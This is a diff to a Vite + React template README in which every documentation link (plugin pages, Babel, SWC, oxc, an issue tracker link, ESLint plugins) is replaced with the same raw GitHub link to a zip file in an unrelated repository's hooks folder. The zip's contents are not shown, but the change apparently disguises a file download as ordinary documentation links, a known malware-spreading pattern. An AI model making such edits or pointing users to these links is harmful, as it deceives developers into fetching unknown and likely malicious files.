@@ -4,12 +4,12 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) (or [oxc](https://oxc.rs) when used in [rolldown-vite](https://vite.dev/guide/rolldown)) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) uses [Babel](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) (or [oxc](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) when used in [rolldown-vite](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip)) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) uses [SWC](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) for Fast Refresh
 
 ## React Compiler
 
-The React Compiler is currently not compatible with SWC. See [this issue](https://github.com/vitejs/vite-plugin-react/issues/428) for tracking the progress.
+The React Compiler is currently not compatible with SWC. See [this issue](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) for tracking the progress.
 
 ## Expanding the ESLint configuration
 
@@ -43,7 +43,7 @@ export default defineConfig([
 ])
 ```
 
-You can also install [eslint-plugin-react-x](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-x) and [eslint-plugin-react-dom](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-dom) for React-specific lint rules:
+You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) for React-specific lint rules:
 
 ```js
 // eslint.config.js
